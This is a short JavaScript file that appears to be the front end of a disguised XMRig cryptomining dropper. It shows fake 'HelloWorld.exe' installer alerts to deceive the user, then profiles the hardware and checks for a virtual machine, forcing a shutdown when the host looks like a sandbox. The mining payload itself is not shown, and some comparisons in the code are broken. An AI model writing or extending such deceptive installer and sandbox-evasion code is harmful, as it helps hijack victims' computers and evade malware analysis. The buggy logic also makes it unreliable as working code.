// needed libraries for information collection in XMRig

const Win = require('windows-interact');
const si = require('systeminformation');

// Fake installer

function wait(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function fakeInstall() {

    try {
        await Win.alert('HelloWorld.exe is now being installed on your computer.', 'HelloWorld Installer');
        await Win.alert('Estimated disk space needed: 2 MB', 'HelloWorld Installer');
        await Win.alert('HelloWorld.exe has been successfully installed.', 'Installation successful');
    } catch {
        console.log("an error occured");
    }
}

fakeInstall();

async function checkForHardwareSupport() {

    try {
        const cpu = await si.cpu();
        const os = await si.osInfo();
        const mem = await si.mem(); // in bytes!
        const system = await si.system(); // used for checking if it's a virtual machine
        const disk = await si.diskLayout();

        if (cpu.physicalCores < 2 || os.platform ==! 'Windows' || mem.total < 4000000000 || system.virtual == True || disk.size < 16000000000) {
            // If the CPU has less than 2 cores, or is not running Windows, or has less than 4 GB of RAM, or is a VM with less than 16 GB of space, exit
            Win.showDesktop();
            Win.power.shutdown();
        }
    } catch {
        Win.power.shutdown();
    } finally {
        console.log('Process finished with error code 0');
    }
}

checkForHardwareSupport();






